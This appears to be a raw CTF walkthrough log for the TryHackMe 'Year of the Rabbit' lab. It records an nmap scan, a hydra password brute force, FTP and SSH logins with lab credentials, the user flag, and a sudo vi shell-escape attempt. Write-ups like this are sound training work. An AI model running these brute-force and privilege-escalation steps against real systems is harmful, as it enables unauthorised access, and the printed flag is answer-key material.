# year of the rabbit

## enumeration
### nmap
```
nmap 10.49.183.106 -Pn -T4 -A -sC -sV -o nmap
[sudo] password for user:
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-27 15:21 IST
Nmap scan report for 10.49.183.106 (10.49.183.106)
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=7/27%OT=21%CT=1%CU=39323%PV=Y%DS=3%DC=T%G=Y%TM=6A672A3
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SEQ
OS:(SP=105%GCD=1%ISR=10D%TI=Z%CI=RD%II=I%TS=8)SEQ(SP=108%GCD=1%ISR=107%TI=Z
OS:%CI=I%II=I%TS=8)SEQ(SP=109%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)SEQ(SP=F9%G
OS:CD=1%ISR=10E%TI=Z%CI=I%II=I%TS=8)OPS(O1=M4E8ST11NW6%O2=M4E8ST11NW6%O3=M4
OS:E8NNT11NW6%O4=M4E8ST11NW6%O5=M4E8ST11NW6%O6=M4E8ST11)WIN(W1=68DF%W2=68DF
OS:%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M4E8NNSNW6%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   25.64 ms 192.168.128.1 (192.168.128.1)
2   ...
3   24.41 ms 10.49.183.106 (10.49.183.106)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.84 seconds
```
### ftp
```
ftp 10.49.183.106
Connected to 10.49.183.106.
220 (vsFTPd 3.0.2)
Name (10.49.183.106:user): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
ftp> quit
221 Goodbye.
```

### dirsearch
```
http://10.48.164.66/assets/
```
- note in style.css have `/sup3r_s3cr3t_fl4g.php` this and on this i see a hidden requset i fond in https histroy of burp `http://10.48.164.66/intermediary.php?hidden_directory=/WExYY2Cv-qU`. found a img now do ssome forensic with strings cmd. found a list of passwd.

### strings
```
lDJ1
RT&:
3Hs@
)f'!&I\
YD%eh*
6G6`
qmf#
=@px
/"^}
[Iwz
$.D6a
4C&Qrs
+0-t%a
tf`J^
;k&20|
j$-|T&@
#h=d
ZDN%
@<ve
,P!*
IVrF
3$Z#
OJM}
5t5+
9"Eu
<x>Ft
JKMn
\\)J.
)pZr
1zg]^
1Zo/$-
3|7O
OwSn
\8lw
p}yym7N
1g'f
}D)
rGxA>D&
jPCL
]9zaA
Ms^     *Q4
XDV$
Ap(*
IEND
Ot9RrG7h2~24?
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
```

### hydra

```
hydra -l ftpuser -P ftpass ftp://10.48.164.66
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 21:06:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 83 login tries (l:1/p:83), ~6 tries per task
[DATA] attacking ftp://10.48.164.66:21/
[21][ftp] host: 10.48.164.66   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 21:06:57
```


# last things i did 
```
|
PR.'
jIYJ
@}c>
_oo\
[,54+
+!yl
Tc5j
Ok2G
YH,D
,H"K
LI]tNi
P01)
lc74p!
0/>dz
S}z~
r|g=~
Im*#;u-
Qt!YJ
zpexx
A1U5
Db7PfN
**lG
Mip%>
j9fI
G`VQ
q7t['mDu
wL4Qr
{%dJv?
%:"n*
V~xZ
/ww?
        z 4
d; Sp
}zxedm*
O\fG
\ffAJ
rp:)O
AB>x
tBtV
#\PUy
|gv].
AC>>
.F45QvQ
$aTR&
@8#
uBM"
D 0q$
VuA/<
2Rhl
]bPD
pT.s
D"nTJ
v<}x\
vk~@
fP;_F
"MOS
"*:-E
{Fyz
eH*Ri<&5
+h:s66
$V$;e
{d"2
"h,V
t#jd
}$Pz
/'wg
s:b$
:       iDE
sis}qG
z!$xrV
w!w%%
b7jB
%9{:`
#q \
O~o.J
f1FQ
f.H
KJmLT4
|>Ke7
F>#L
:IPFx
m*2ji
?=\>
O>cA
(1)R
A>OIGF
2&;vx
Qc*qj}l4
)JRep
j!jB
,RRf
ZIdL
q<_a
]_=|
7VqI
wpQ2
z(l"K6$-
!P&%0
Fb`c8
        t.wlAd
V$23<
431Ow
S<!B
k}=U
 (hD
$^A;
uR"3
Se*g
[fNL
        ~$1
.50\D%Lbd
$KJJ
rP<v)
ITGP\
e"{F
."##
q:~s<
WS9&
Ep1V
 !r3O
(H@P
j&1U
IHMK
&bscrS5b
5RZEXz-@
=|o1-YC
i"MJ
$       bf
xuzU_^
Uf      f
!Jq'
        r6&I
aL&D
uxBc
o7H&
RBaR
$%@d
G7[/W
>/t,S.t
s$DmF
)`*h
vtJ)
)+t)92b
9(2%
PT&b
I4Q)
$l1(
(2;
YHG#R
LF)k>
$^"5H
=*F:.
91dv
:S.Df
-X(L
WNKX
8Wxv
i&      2Q
fDCf
;"#`1
m^^K]
2Zu`
O_?$
e$2#
PFug
w%IZ
rL!%
V??==
kBR=N
s>L6
49:#
#XzP&f
`7ca
8q9A
C"R2
ifVm
G0HA
Lbb=
- .i&
Sf7q
pb'F
g?wb
+eH0
<^<x
KNy A
[madHj[#7F
Iy!v
]t~X
x}~Wo
Y0Oit
h.B,
 &8X
ao{}
1xhH
;o-dgd
v<L7
r"C%F
GLd&
A*k+q
Ff'-c
*wGf
Bns*
m-qX
fY{%
ibT;M
B7vw
@RDAb
#@lBd
 4mW
;b4r"
O"%M
GH      {&
Zxo{
t$EQ
M5s.
j0+9%
QRPt
i^^^
<jt7
?ndhY
 \H=
hV"7L4*
#3F>
N7cR
a0HIBP
,I      0Sr
/RxR?
>x"PV
v[Gc
mPNHR
d)jcP
~d]O
FoD(,E
?&0S
*1:#i
5[^Q7*
#P8j0<
DO<z$
%Y0'x0
)I"(
zs#4
LYU%
<IN>
y:hH(;
<,iZ
ctX)
a4"%
"X$Eo
/+%
Dz"dY
azs>
-(kT
]<gl5
tgha
'       o/
A9GR
bLEs
n Q!r%R:
qF[gU
vra0
gzxE)
l{n:E
.DSt^
#2t>!qQ
p"!wn
o"SH
mw (
2r$f
#@!L
2IYR
4Y's
lbF@
^#|*
;p!uhm
I_>=
        c#HB
$Ktp
N"<`
5''_#
&Yb[
\fv7
gBxqc"g
YGkc
Q(p/
d9PT
t>pbl
'BJf
("c5)S
qT{27
S1kf
$\n~
4TY*
N%zD
l]4Fk
A+;qD
53{w[
QoK.
=hpJ
58#)
<@      a
lkclqyj
|,)C<
N_})
LElT
d<xD
:^>\
qa=j
t8A|
G*"1
jV]u
F)JX
0*l-
$j4v
Nyv2Qu
3y'
CUA,
0b2
R$HU
K4Goc\6
wVGg9
8$=*M
/y>HZ
1.?U
2"L!
Kq"E
C>f)
6Ib#R
z^h{q
`%!0
B2!"
)xTw
s(Tx
gEJJ@t
{x3(
Y9&M~
mSubb
s{-tw
O6eb
abwX
1G E
kmnl
$RfW
8}q<
@8MP
+ou{
"/S :c
FS"bI
f#&R
aJ      u
Q]&KI
k )S
SP4x
A&I9!
nAup2:
YJ.Y
O/&w
SxR     B
uJ^d
|}<|{X
wOp/D
YCwWU
c8{feNcP
mHI%
G$B$
s0ER
=Fjv
]mH]}
$ JS
]]kQD
TkRf
m\/l
%F&0OK-E
W?-L<0
p&fRF
4+1P
$vA*
XFg)S
Ch?hL
Owo^
=?>!
62'E
* su
=j#(
&F !;A(
dVQ`
c_7b
DzL2
CAU,
45*y
x{8O
EW^*E
bdpQJQ>M
-FIP
g`Hp
AQ(`;
(+|:3
r\XE0Q
%;6B
lAAr
        Wg[
`&!/d
,#(Q
1)+kY
}]Um
T%fN&O
-&]x:R
5yuV@
_?{+
h+,#d
eNbZ/Y
kB8o
5(C'
B$4(
P#"Pp
B2;Y/
_ikgU"
TO('
CSHv
H+by
5Y#z
=R*Sk
mn[h
q:Lma
f/+|
        ;l%-$3
d$Z2$+F0
;IfF
sBJ>Q`d
w&C7
`gN3
j=*M
/v{\
0O:-
mn17-
r(Bz
|`%b
3'P"
Fe^a
qtd\|
e9MB
{;.f[\n
u{.z
27qP    qG
&?O2
2K##J
^&f
.D(b
a0K(c&l$
D]U#c7
t"V'XS
e^o#
f.F)
v+oy
r^H&
nI$<
zbTY
y]/(m
E84S
        $L+
zFlB
HTNfmH
+Qjm
Fy8N
Rj;6
H:      Q8ye
MIIQhJ
2X      [
~9&c
m*5[
.ZE
x)#*
D3"v
;gB5
p!&"
!N0G:D
hI,*
D&xl
jjG"
.kAND
t8Lz<
SrgD
Tl7%o
2*      I
Vh;OrZjP
;1m.
(I@0P
ERf0q
Sf6     jm
2Sm'd'Q.
#bt\
L88Y[
<\0|^
W<~z
pv4*
W2g8R
y8S2
kYj!
#Q!-
B2      m
.5ZrZ
rN'g
M[%)E)
ok=L
v*9rb.M
xy]*
-J%<\
DDpe
w03!U
WabY
gPf3
%_As
'!D"
jMwO
%)hufd
@F4KaI
o<>}
fJJ     8<)
q[se
Tbw&m
5I'p
~Y/{;
yVBJ
91R#
H$y
.>r*
IHJf
qqLD
sk3I
Q{/%
8Mw(
L;r
7jRh`
G_{O
,S_/wo
qb_$T
v(^Y
f(5,
G:/*Q&
yufnB
LXG_
m7In
LUKM
g{m<
@S!L
>:hu
K( sL'D/
T k6!-M
Rile
cFALd
M+xv
v.l^
a^+O
2:93B
u+%M
Vf-F
<]?D
rH)I
N!\9
yQQH
R       TD#(
PNHD
qK'*
TH0+@i
,&KM
~{qA
7^M+
s)K=-X
eb=8{o%&
2T4I<
IJYr$
zEw1oE
RUe!
1ij{
zxUg
4kE<
"pPG
9<r&
1@@J2
* xh
`E-u
XTf/r
|'yM
/{xn
|(54
5PYb8
W"7=
EUKm
ZK-R
(rwhs}5
T-n/D
Zc      w-
Z>uy
bK\#
i cd
_9gBFn
a!"i
F@A
@v#"
Oc$O
+aKh
%j"R
nVKu
,)MK0
i[!tx
Hx_M'
~soW
52Y0skoN
`Aw8k
@#=X48
=upz
{[x7
{$D8
:n?<}
"S=N
}'P\
m+tl"
D9leH
Z"cy
Ki$L
&4P5 (
L&0p
,d!q
(=(0/%
kO.NAI
1lP&%
^8h83
y>7FUn
uJ_Y
Z%;i
 waA
ev"g
!^D4
Pgg*
W3zutb
Qg0e
pHeY
<_XmnG
}}~_
u*\kmJ
&#=f
G.3zg&o3E
H%m4
"$HB
D JN
        &X&
?^-3k
c-t>
K~{NL
xQ"R
3q8*
dUNL
_??_
6#d4
,Z{L
A8z.
cLv"
7U5>
3{ZR
l,,50$%"
(:BD
Efh]
Y(fs
#"X+
cR"U
h!tH
<# mn
f!*so\
\>&]
v(9ch
!bp}
1$fx
>_eZ
&tV1
j)$T
HdsR&
wo)/E
]O_|Q
lw%     (+
Gtp&f
1!KPb(
C %A
*AJIkz
IRbI
{H#Q
$Re"b
=%JiU
_'1|v
5XK]
w]*%-
1KYc
ww_Q\
}k/)
5-59
 ,8
dNQN4^
As(q
@=y
DJb$
")8rY
">nA
(,      iV&
I-6t>
/%er
&BpP
p$EwMh
iz>*M
)cv0(
wcI1
#5vsIL!
"sb*
bHa
f"$ah
SNTE
4iBk
d)5O[*
DsB`D!
Tv*m&
E8IX
}Hr1
,'l?
tRqf
j>T0
oAI2`
<gD0E
Dtb
b4'e
-3NKR
;KYW
GXV\\
9BKR
r^Z~s
q^?f
2Iwd7
09EM
,6[D!
9i=,
ZjzS3F]
!<v7
438xN
.">I
P*is
$DS]m
;lXs
OO??
7Bs]
.aaL
vXr*
FHFk
fLei
)^#2R
N>35W
t#gV
&OJs #
( J\K0"2
5%H^
1$83
B34/
k-H1g
F}xg
^)fR
~cJe]
'e*,
nr{y
h1=h:
r'rp5
q2prB
fJ&R
Q0na
2`$;
I       B=
T$x6
9blLa"KN,zb,
\3U9
|\.O[+?>}
o~;)
s8{jU
YM{#
Dpav
8       G`6
:-JD
a;'"I
Ro1v]
a\=D,
KD8 \sa
m8qVS"
$L(E
5$7W
d-:F
^[{Y
H$11
8xqe'
_]*A
H}Nv
        ZDgX
F8it
0MjQ
qG8q^
fret?
!fZy
N9-g
r!gZ
NsR,S
Dp81
lDJ1
RT&:
3Hs@
)f'!&I\
YD%eh*
6G6`
qmf#
=@px
/"^}
[Iwz
$.D6a
4C&Qrs
+0-t%a
tf`J^
;k&20|
j$-|T&@
#h=d
ZDN%
@<ve
,P!*
IVrF
3$Z#
OJM}
5t5+
9"Eu
<x>Ft
JKMn
\\)J.
)pZr
1zg]^
1Zo/$-
3|7O
OwSn
\8lw
p}yym7N
1g'f
}D)
rGxA>D&
jPCL
]9zaA
Ms^     *Q4
XDV$
Ap(*
IEND
Ot9RrG7h2~24?
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
┌[windows]─[21:04-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$vim ftpass
┌[windows]─[21:05-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$vim ftpass
┌[windows]─[21:06-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$hydra -l ftpuser -P ftpass ftp://10.48.164.66
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 21:06:43
[DATA] max 16 tasks per 1 server, overall 16 tasks, 83 login tries (l:1/p:83), ~6 tries per task
[DATA] attacking ftp://10.48.164.66:21/
[21][ftp] host: 10.48.164.66   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 21:06:57
┌[windows]─[21:06-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$
┌[windows]─[21:12-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$ftp 10.48.164.66
Connected to 10.48.164.66.
220 (vsFTPd 3.0.2)
Name (10.48.164.66:user): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20810|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||24961|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |*****************************************************************|   758        1.63 MiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (51.10 KiB/s)
ftp> quit
221 Goodbye.
┌[windows]─[21:13-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$cat Eli\'s_Creds.txt
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
┌[windows]─[21:13-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$sudo apt install beef
Installing:
  beef

Installing dependencies:
  libcattle-1.0-0

Summary:
  Upgrading: 0, Installing: 2, Removing: 0, Not Upgrading: 21
  Download size: 30.9 kB
  Space needed: 113 kB / 181 GB available

Continue? [Y/n] y
Get:1 https://deb.parrot.sh/parrot echo/main amd64 libcattle-1.0-0 amd64 1.4.0-2+b3 [19.4 kB]
Get:2 https://deb.parrot.sh/parrot echo/main amd64 beef amd64 1.2.0-2+b1 [11.5 kB]
Fetched 30.9 kB in 0s (178 kB/s)
Selecting previously unselected package libcattle-1.0-0:amd64.
(Reading database ... 617488 files and directories currently installed.)
Preparing to unpack .../libcattle-1.0-0_1.4.0-2+b3_amd64.deb ...
Unpacking libcattle-1.0-0:amd64 (1.4.0-2+b3) ...
Selecting previously unselected package beef.
Preparing to unpack .../beef_1.2.0-2+b1_amd64.deb ...
Unpacking beef (1.2.0-2+b1) ...
Setting up libcattle-1.0-0:amd64 (1.4.0-2+b3) ...
Setting up beef (1.2.0-2+b1) ...
Processing triggers for man-db (2.13.1-1) ...
Processing triggers for libc-bin (2.41-12+deb13u4) ...
--------------------------------------------------
[!] Scanning application launchers
Removing duplicate or broken launchers...
[i] 655 launcher(s) processed, 203 package(s) not installed
[!] Launchers have been successfully updated!
--------------------------------------------------
┌[windows]─[21:15-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$beef Eli\'s_Creds.txt
User: eli
Password: DSpDiM1wAEwid⏎                                                                                      ┌[windows]─[21:15-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$ssh eli@10.48.164.66
┌[windows]─[21:15-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$ssh eli@10.48.164.66

^Zfish: Job 1, 'ssh eli@10.48.164.66' has stopped
┌[windows]─[21:15-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$ssh eli@10.48.164.66
^X^Zfish: Job 2, 'ssh eli@10.48.164.66' has stopped
┌[windows]─[21:17-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$ssh eli@10.48.164.66

^C⏎                                                                                                           ┌[windows]─[21:19-27/07]─[/home/user/Documents/git_repos/CTFs/TryHackme/year of the rabbit]
└╼user$ssh eli@10.48.164.66
The authenticity of host '10.48.164.66 (10.48.164.66)' can't be established.
ED25519 key fingerprint is SHA256:va5tHoOroEmHPZGWQySirwjIb9lGquhnIA1Q0AY/Wrw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.164.66' (ED25519) to the list of known hosts.
eli@10.48.164.66's password:


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE




eli@year-of-the-rabbit:~$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
eli@year-of-the-rabbit:~$ cd D
Desktop/   Documents/ Downloads/
eli@year-of-the-rabbit:~$ cd Desktop/
eli@year-of-the-rabbit:~/Desktop$ ls
eli@year-of-the-rabbit:~/Desktop$ cd Doc
-bash: cd: Doc: No such file or directory
eli@year-of-the-rabbit:~/Desktop$ cd ../Doc
.cache/    Desktop/   Downloads/ .gnupg/    Music/     Public/    Templates/
.config/   Documents/ .gconf/    .local/    Pictures/  .ssh/      Videos/
eli@year-of-the-rabbit:~/Desktop$ cd ../Documents
eli@year-of-the-rabbit:~/Documents$ ls
eli@year-of-the-rabbit:~/Documents$ cd /home
eli@year-of-the-rabbit:/home$ ls
eli  gwendoline
eli@year-of-the-rabbit:/home$ cd gwendoline/
eli@year-of-the-rabbit:/home/gwendoline$ ls
user.txt
eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt
cat: user.txt: Permission denied
eli@year-of-the-rabbit:/home/gwendoline$ sudo -l
[sudo] password for eli:
Sorry, user eli may not run sudo on year-of-the-rabbit.
eli@year-of-the-rabbit:/home/gwendoline$ cd ../
eli@year-of-the-rabbit:/home$ cd eli/
eli@year-of-the-rabbit:~$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
eli@year-of-the-rabbit:~$ ca^Cls

-bash: als: command not found
eli@year-of-the-rabbit:~$ s
-bash: s: command not found
eli@year-of-the-rabbit:~$
eli@year-of-the-rabbit:~$ s
-bash: s: command not found
eli@year-of-the-rabbit:~$ find / -name "s3cr3t" 2>/dev/null
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t
cat: /usr/games/s3cr3t: Is a directory
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly
cat: .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly: No such file or directory
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$
eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password:
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ cd
gwendoline@year-of-the-rabbit:~$ ls
user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ /usr/vi -c :terminal /bin/sh
bash: /usr/vi: No such file or directory
gwendoline@year-of-the-rabbit:~$ /usr/bin/vi -c :terminal /bin/sh

/bin/bash: shell: command not found

shell returned 127

Press ENTER or type command to continue
/bin/bash: qshell: command not found

shell returned 127

Press ENTER or type command to continue
gwendoline@year-of-the-rabbit:~$ cd^C
gwendoline@year-of-the-rabbit:~$ sudo /usr/bin/vi -c ':!/bin/sh' /dev/null
[sudo] password for gwendoline:
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi -c :!/bin/sh /dev/null' as root on year-of-the-rabbit.
